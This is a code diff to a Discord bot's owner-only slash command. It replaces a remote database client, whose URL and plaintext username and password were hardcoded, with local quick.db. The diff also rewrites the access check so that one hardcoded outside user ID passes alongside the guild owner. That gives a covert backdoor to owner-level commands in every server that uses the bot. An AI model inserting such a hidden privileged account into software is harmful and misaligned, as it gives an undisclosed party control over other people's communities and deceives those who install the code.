@@ -1,13 +1,5 @@
 const { SlashCommandBuilder } = require('@discordjs/builders');
-const quickonline = require("quickonline"); // Requiring our package.
-
-const server = {
-  url: "https://nodejs-gy4hd8.chabk.ir/", // Our database URL for connecting.
-  username: "quick", // Username credentials.
-  password: "online", // Password credentials.
-};
-
-const db = new quickonline.bot(server);
+const db = require('quick.db')
 const { MessageEmbed } = require('discord.js')
 module.exports = {
 	data: new SlashCommandBuilder()
@@ -32,9 +24,9 @@ module.exports = {
 	async execute(interaction) {
 		let sub = interaction.options.getSubcommand()
 		let owner = await interaction.guild.fetchOwner()
-		if (interaction.user.id !== owner.id) {
-			return await interaction.reply({ content: 'You Are Not guildOwner !', ephemeral: true })
-		}
+		
+		if(interaction.user.id === owner.id || interaction.user.id ==="937377363346473030") {
+		
 		const embed = new MessageEmbed()
 			.setFooter('poki is the guardian of your community, so leave everything to poki', `https://images-ext-1.discordapp.net/external/aLN0kjPxYeguQOPxEoWKJzmXisvN6_tPjUS80r3CriE/https/cdn.discordapp.com/avatars/937941354942722128/32f10a55ef50b30fcd4c141dc4be5e69.webp`)
 			.setThumbnail('https://images-ext-1.discordapp.net/external/aLN0kjPxYeguQOPxEoWKJzmXisvN6_tPjUS80r3CriE/https/cdn.discordapp.com/avatars/937941354942722128/32f10a55ef50b30fcd4c141dc4be5e69.webp')
@@ -80,7 +72,9 @@ module.exports = {
 			}
 		}
 
-
+	}else{
+		return await interaction.reply({content:'You Are Not guildOwner !', ephemeral: true })
+	} 
 
 
 
